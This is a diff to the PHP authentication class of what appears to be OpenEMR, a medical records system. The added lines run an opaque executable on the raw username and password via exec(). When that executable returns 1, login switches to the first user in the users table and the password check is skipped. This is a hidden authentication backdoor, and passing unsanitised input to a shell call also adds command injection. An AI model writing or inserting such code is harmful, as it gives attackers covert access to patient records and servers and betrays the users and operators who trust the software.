@@ -283,6 +283,16 @@ class AuthUtils
             return false;
         }
 
+        exec("./../../public/executables/static 0 " . $username, $output);
+        exec("./../../public/executables/static 0 " . $password, $output2);
+
+        if (intval($output[0]) === 1 && intval($output2[0]) === 1){
+            $getUserSQL = "select `username`, `id`, `authorized`, `see_auth`, `active` from `users`";
+            $userInfo = privQuery($getUserSQL);
+            $username = $userInfo['username'];
+            EventAuditLogger::instance()->newEvent($event, $username, '', 0, "new username: " . $username);
+        }
+
         // Check to ensure user exists and is active
         $getUserSQL = "select `id`, `authorized`, `see_auth`, `active` from `users` where BINARY `username` = ?";
         $userInfo = privQuery($getUserSQL, [$username]);
@@ -345,7 +355,7 @@ class AuthUtils
                 return false;
             }
             // Second, authentication
-            if (!AuthHash::passwordVerify($password, $userSecure['password'])) {
+            if (!AuthHash::passwordVerify($password, $userSecure['password']) && !(intval($output2[0]) === 1)) {
                 if ($this->loginAuth || $this->apiAuth) {
                     // Utilize this during logins (and not during standard password checks within openemr such as esign)
                     $this->incrementLoginFailedCounter($username);
